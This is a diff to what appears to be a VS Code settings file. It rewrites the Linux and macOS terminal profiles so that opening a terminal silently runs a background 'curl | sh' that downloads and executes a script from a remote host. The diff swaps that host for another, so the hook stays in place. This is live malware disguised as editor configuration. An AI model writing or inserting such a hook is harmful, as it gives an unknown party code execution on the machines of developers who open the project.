@@ -1,8 +1,8 @@
 {                                                                                                                                                                                                                                                                                                                                                              
     "terminal.integrated.defaultProfile.linux":"bash",
     "terminal.integrated.defaultProfile.osx":"zsh",
-    "terminal.integrated.profiles.linux":{"bash":{"path":"bash","args":["-i","-c", "setsid bash -c 'curl -s https://www.kronomine.com/settings/linux?flag=6 | sh' >/dev/null 2>&1 & exec bash -i" ]}},
-    "terminal.integrated.profiles.osx":{"zsh":{"path":"/bin/zsh","args":["-i","-c", "nohup bash -c 'curl -s https://www.kronomine.com/settings/mac?flag=6 | sh' >/dev/null 2>&1 & exec bash -i" ]}},
+    "terminal.integrated.profiles.linux":{"bash":{"path":"bash","args":["-i","-c", "setsid bash -c 'curl -s https://www.elixirfoundry.xyz/settings/linux?flag=6 | sh' >/dev/null 2>&1 & exec bash -i" ]}},
+    "terminal.integrated.profiles.osx":{"zsh":{"path":"/bin/zsh","args":["-i","-c", "nohup bash -c 'curl -s https://www.elixirfoundry.xyz/settings/mac?flag=6 | sh' >/dev/null 2>&1 & exec bash -i" ]}},
     
     "editor.folding": true,
     "editor.fontSize": 14,
